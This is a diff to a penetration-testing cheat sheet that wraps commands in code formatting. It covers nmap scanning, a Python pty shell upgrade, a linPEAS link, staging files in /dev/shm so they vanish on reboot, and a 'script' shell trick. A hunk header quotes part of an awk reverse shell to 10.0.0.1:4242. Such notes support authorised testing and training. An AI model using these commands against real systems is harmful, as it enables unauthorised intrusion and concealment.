@@ -1,12 +1,12 @@
 #### DATA COLLECTION ####
 
-nmap -sV -sC -oA <ip> <outputfile>
+```nmap -sV -sC -oA <ip> <outputfile>```
 
 Dirb any available port 80 address
 
 ### TTY SHELL
 
-python -c 'import pty; pty.spawn("/bin/sh")'
+```python -c 'import pty; pty.spawn("/bin/sh")'```
 
 https://netsec.ws/?p=337
 
@@ -25,7 +25,7 @@ https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh
 
 ### STORE FILES IN MEM
 
-/dev/shm
+```/dev/shm```
 
 Upload any files to Ram disk that will clear on reboot.
 
@@ -62,7 +62,7 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 
 ### SHELL COMMANDS ###
 
-SHELL=/bin/bash script -q /dev/null
+```SHELL=/bin/bash script -q /dev/null```
 
 Explanation for /dev/null
 https://askubuntu.com/questions/306047/what-does-the-script-dev-null-do
